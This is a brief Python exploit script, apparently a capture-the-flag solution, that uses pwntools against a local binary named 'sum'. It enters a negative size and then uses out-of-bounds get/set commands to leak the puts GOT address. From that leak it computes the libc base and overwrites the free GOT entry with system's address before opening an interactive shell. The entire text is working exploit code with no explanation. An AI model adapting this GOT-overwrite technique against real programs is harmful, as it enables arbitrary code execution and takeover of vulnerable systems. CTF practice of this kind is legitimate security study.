from pwn import *

p=process('./sum')
lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')
e=ELF('./sum')

def set_val(a,b):
    p.sendlineafter('\n> ','set {} {}'.format(a,b))
    log.info('SETTING {} to {}'.format(b,a))

def get_idx(a):
    p.sendlineafter('\n> ','get {}'.format(a))
    b= p.recvline()
    log.info('Val at {} : {}'.format(a,b))
    return b

def sum():
    p.sendlineafter('\n> ','sum')

def quit_():
    p.sendlineafter('\n> ','quit')
puts_got= e.got['puts']
log.info('[ADDR PUTS_GOT]: '+ hex(puts_got))

p.sendlineafter('?\n> ','-1')

leaked=get_idx(puts_got/8)
log.info('[LEAKED ADDR]: '+hex(int(leaked)))
libc_base=int(leaked)-lib.sym['puts']
log.info('[LIBC_BASE]: '+hex(libc_base))
free_=e.got['free']
log.info('[FREE FUNC]: '+hex(free_))

set_val(free_/8,(libc_base+lib.sym['system']))

p.interactive()